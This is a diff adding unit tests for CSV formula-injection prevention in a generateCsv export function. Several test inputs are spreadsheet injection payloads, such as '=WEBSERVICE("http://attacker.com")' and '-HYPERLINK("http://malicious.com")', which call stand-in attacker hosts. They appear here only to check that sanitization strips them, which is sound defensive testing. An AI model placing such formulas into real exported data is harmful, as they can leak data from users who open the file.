@@ -49,6 +49,175 @@ describe('generateCsv', () => {
       .toEqual(`Id,Foo,Empty,Nested link field / Link URL,Nested link field / Secondary Links,Relation
 1,some field,,https://www.test.com,"[{""label"":""secondary link 1"",""url"":""https://www.test.com""},{""label"":""secondary link 2"",""url"":""https://www.test.com""}]",a relation`);
   });
+
+  describe('CSV Injection Prevention', () => {
+    it('prevents formula injection with equals sign', () => {
+      const columns = [
+        { label: 'Name', metadata: { fieldName: 'name' } },
+        { label: 'Formula', metadata: { fieldName: 'formula' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          name: 'Test User',
+          formula: '=WEBSERVICE("http://attacker.com")',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      // The malicious formula should be sanitized (left-trimmed of dangerous characters)
+      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
+      expect(csv).not.toContain('=WEBSERVICE("http://attacker.com")');
+    });
+
+    it('prevents formula injection with plus sign', () => {
+      const columns = [
+        { label: 'Calculation', metadata: { fieldName: 'calculation' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          calculation: '+1+1',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      expect(csv).toContain('1+1');
+      expect(csv).not.toContain('+1+1');
+    });
+
+    it('prevents formula injection with minus sign', () => {
+      const columns = [
+        { label: 'Calculation', metadata: { fieldName: 'calculation' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          calculation: '-1+1',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      expect(csv).toContain('1+1');
+      expect(csv).not.toContain('-1+1');
+    });
+
+    it('prevents formula injection with at symbol', () => {
+      const columns = [
+        { label: 'Reference', metadata: { fieldName: 'reference' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          reference: '@SUM(1,1)',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      expect(csv).toContain('SUM(1,1)');
+      expect(csv).not.toContain('@SUM(1,1)');
+    });
+
+    it('prevents formula injection with tab character', () => {
+      const columns = [
+        { label: 'Data', metadata: { fieldName: 'data' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          data: '\t=WEBSERVICE("http://attacker.com")',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
+      expect(csv).not.toContain('\t=WEBSERVICE("http://attacker.com")');
+    });
+
+    it('prevents formula injection with carriage return', () => {
+      const columns = [
+        { label: 'Data', metadata: { fieldName: 'data' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          data: '\r=WEBSERVICE("http://attacker.com")',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      expect(csv).toContain('WEBSERVICE(""http://attacker.com"")');
+      expect(csv).not.toContain('\r=WEBSERVICE("http://attacker.com")');
+    });
+
+    it('handles multiple injection attempts in different fields', () => {
+      const columns = [
+        { label: 'Field1', metadata: { fieldName: 'field1' } },
+        { label: 'Field2', metadata: { fieldName: 'field2' } },
+        { label: 'Field3', metadata: { fieldName: 'field3' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          field1: '=WEBSERVICE("http://evil.com")',
+          field2: '+SUM(A1:A10)',
+          field3: '-HYPERLINK("http://malicious.com")',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      // All dangerous characters should be stripped
+      expect(csv).toContain('WEBSERVICE(""http://evil.com"")');
+      expect(csv).toContain('SUM(A1:A10)');
+      expect(csv).toContain('HYPERLINK(""http://malicious.com"")');
+
+      // Original dangerous payloads should not be present
+      expect(csv).not.toContain('=WEBSERVICE("http://evil.com")');
+      expect(csv).not.toContain('+SUM(A1:A10)');
+      expect(csv).not.toContain('-HYPERLINK("http://malicious.com")');
+    });
+
+    it('preserves legitimate content that does not start with dangerous characters', () => {
+      const columns = [
+        { label: 'Name', metadata: { fieldName: 'name' } },
+        { label: 'Email', metadata: { fieldName: 'email' } },
+        { label: 'Description', metadata: { fieldName: 'description' } },
+      ] as ColumnDefinition<FieldMetadata>[];
+
+      const rows = [
+        {
+          id: '1',
+          name: 'John Doe',
+          email: 'john@example.com',
+          description:
+            'This is a normal description with = and + symbols in the middle',
+        },
+      ];
+
+      const csv = generateCsv({ columns, rows });
+
+      // Legitimate content should be preserved
+      expect(csv).toContain('John Doe');
+      expect(csv).toContain('john@example.com');
+      expect(csv).toContain(
+        'This is a normal description with = and + symbols in the middle',
+      );
+    });
+  });
 });
 
 describe('displayedExportProgress', () => {
